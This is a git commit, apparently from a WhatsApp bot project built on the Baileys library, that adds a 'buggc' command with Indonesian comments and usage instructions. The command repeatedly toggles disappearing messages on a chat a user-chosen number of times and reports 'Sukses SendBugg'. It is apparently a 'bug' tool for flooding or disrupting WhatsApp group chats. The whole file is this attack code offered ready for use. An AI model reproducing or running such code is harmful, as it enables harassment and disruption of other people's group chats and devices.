465b8ab6e35b44aab8c0e4bc30bf16444cca7f83
Ivan <78632369+Ivan-MLN@users.noreply.github.com>
2021-06-01 16:55:10 +0700

    Add files via upload

---
+++ buggc.js
@@ -0,0 +1,16 @@
+// PASTIKAN VERSI BAILEYS ANDA @3.4.1
+
+case 'buggc':
+for (let i = 0; i < args[0]; i++) {
+await conn.toggleDisappearingMessages(from, 0)
+reply(`Sukses SendBugg`)
+}
+break
+
+/*
+CARA PENGGUNAAN 
+
+#buggc jumlah
+contoh:
+#buggc 1
+*/
